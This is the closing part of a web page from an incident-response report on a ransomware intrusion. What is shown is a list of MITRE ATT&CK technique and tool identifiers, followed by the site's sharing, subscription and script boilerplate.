Windows Management Instrumentation - T1047
Windows Command Shell - T1059.003
Malicious File - T1204.002
PowerShell - T1086
Service Execution - T1035
Scheduled Task - T1053.005
Exploitation for Privilege Escalation - T1068
Access Token Manipulation - T1134
Regsvr32 - T1218.010
Rundll32 - T1218.011
DCSync - T1003.006
LSASS Memory - T1003.001
Domain Trust Discovery - T1482
System Information Discovery - T1082
Remote System Discovery - T1018
Group Policy Discovery - T1615
System Language Discovery - T1614.001
System Time Discovery - T1124
Network Share Discovery - T1135
Domain Account - T1087.002
File and Directory Discovery - T1083
Remote Desktop Protocol - T1021.001
SMB/Windows Admin Shares - T1021.002
Lateral Tool Transfer - T1570
Windows Remote Management - T1021.006
Local Data Staging - T1074.001
Web Protocols - T1071.001
Exfiltration to Cloud Storage - T1567.002
Data Encrypted for Impact - T1486
Account Access Removal - T1531
Disable or Modify Tools - T1562.001
Mark-of-the-Web Bypass - T1553.005 <br/>System Owner/User Discovery - T1033 </pre>
<pre class="wp-block-preformatted">S0002 - Mimikatz
S0154 - Cobalt Strike
S0359 - Nltest
S0039 - Net
S0096 - Systeminfo
S0100 - IPconfig
S0552 - AdFind</pre>
<p>Internal case #18041</p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-16873" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/?share=twitter" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-16873" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/?share=linkedin" target="_blank" title="Click to share on LinkedIn"><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/?share=reddit" target="_blank" title="Click to share on Reddit"><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-16873" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/?share=facebook" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared class="share-jetpack-whatsapp sd-button share-icon" href="https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp"><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id="jp-relatedposts" class="jp-relatedposts">
<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
</div>
<footer class="entry-footer">
<div class="entry-meta">
</div>
</footer>
</div>
</article>
<nav class="navigation post-navigation" aria-label="Posts">
<h2 class="screen-reader-text">Post navigation</h2>
<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2023/03/06/2022-year-in-review/" rel="prev">2022 Year in Review</a></div><div class="nav-next"><a href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/" rel="next">IcedID Macro Ends in Nokoyawa Ransomware</a></div></div>
</nav>
</main>
</div>
<aside id="secondary" class="widget-area">
<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
<label>
<span class="screen-reader-text">Search for:</span>
<input type="search" class="search-field" placeholder="Search &hellip;" value name="s" />
</label>
<input type="submit" class="search-submit" value="Search" />
</form></section><section id="google_translate_widget-5" class="widget widget_google_translate_widget"><div id="google_translate_element"></div></section><section id="block-7" class="widget widget_block"> <div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
<form action="https://wordpress.com/email-subscriptions" method="post" accept-charset="utf-8" data-blog="175340963" data-post_access_level="everybody" data-subscriber_email id="subscribe-blog">
<div class="wp-block-jetpack-subscriptions__form-elements">
<p id="subscribe-email">
<label id="subscribe-field-label" for="subscribe-field" class="screen-reader-text">
Type your email… </label>
<input required="required" type="email" name="email" class="no-border-radius " style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;" placeholder="Type your email…" value id="subscribe-field" title="Please fill in this field." /> </p>
<p id="subscribe-submit">
<input type="hidden" name="action" value="subscribe" />
<input type="hidden" name="blog_id" value="175340963" />
<input type="hidden" name="source" value="https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/" />
<input type="hidden" name="sub-type" value="subscribe-block" />
<input type="hidden" name="app_source" value />
<input type="hidden" name="redirect_fragment" value="subscribe-blog" />
<input type="hidden" name="lang" value="en_US" />
<input type="hidden" id="_wpnonce" name="_wpnonce" value="2bedf18890" /><input type="hidden" name="_wp_http_referer" value="/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/" /><input type="hidden" name="post_id" value="16873" /> <button type="submit" class="wp-block-button__link no-border-radius" style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;" name="jetpack_subscriptions_widget">
Subscribe </button>
</p>
</div>
</form>
</div>
</div>
</section><section id="block-21" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png" alt class="wp-image-35571 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png 200w, https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h4 class="wp-block-heading"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc">Register For Our Next CTF</a></h4>
</div></div>
</section><section id="block-8" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png" alt class="wp-image-21332 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/" data-type="link" data-id="https://thedfirreport.com/">Reports</a></h3>
</div></div>
</section><section id="block-9" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/threat-intelligence/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png" alt class="wp-image-21334 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></h3>
</div></div>
</section><section id="block-10" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/detection-rules/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png" alt class="wp-image-21336 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></h3>
</div></div>
</section><section id="block-16" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/dfir-labs/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png" alt class="wp-image-31051 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png 200w, https://thedfirreport.com/wp-content/uploads/2024/04/labs-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a></h3>
</div></div>
</section><section id="block-12" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/mentoring-coaching-program/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png" alt class="wp-image-21333 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/help4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring and Coaching</a></h3>
</div></div>
</section></aside>
</div>
</div>
</div>
<footer id="colophon" class="site-footer" role="contentinfo">
<div class="copyright-area">
<div class="wrap">
<div class="site-info">
<a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Copyright 2023 | The DFIR Report | All Rights Reserved </div>
<div class="footer-right-info">
</div>
</div>
</div>
</footer>
<button href="#" class="back-to-top" type="button"><i class="fa-solid fa-arrow-up-long"></i>Go Top</button>
</div>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="cd9a07d5db3466cea3ec1774-text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2023\/04\/03\/malicious-iso-file-leads-to-domain-wide-ransomware\/":16873};
	</script>
<style id="jetpack-block-subscriptions-inline-css" type="text/css">
.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button[contenteditable=true],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button[contenteditable=true]{white-space:pre-wrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}
</style>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=6.6.2" id="freenews-navigation-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=6.6.2" id="freenews-skip-link-focus-fix-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=6.6.2" id="ResizeSensor-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=6.6.2" id="theia-sticky-sidebar-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=6.6.2" id="slick-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=6.6.2" id="freenews-slick-settings-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=6.6.2" id="jquery-sticky-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=6.6.2" id="freenews-sticky-settings-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=6.6.2" id="marquee-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=6.6.2" id="freenews-marquee-settings-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://stats.wp.com/e-202443.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"175340963\",\"post\":\"16873\",\"tz\":\"0\",\"srv\":\"thedfirreport.com\",\"j\":\"1:13.9.1\"}") ]);
_stq.push([ "clickTrackerInit", "175340963", "16873" ]);
/* ]]> */
</script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/widgets/google-translate/google-translate.min.js" id="google-translate-init-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=13.9.1" id="google-translate-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=13.9.1" id="jetpack-block-subscriptions-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/sharedaddy/sharing.min.js" id="sharing-js-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>
<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="cd9a07d5db3466cea3ec1774-|49" defer></script></body>
</html>
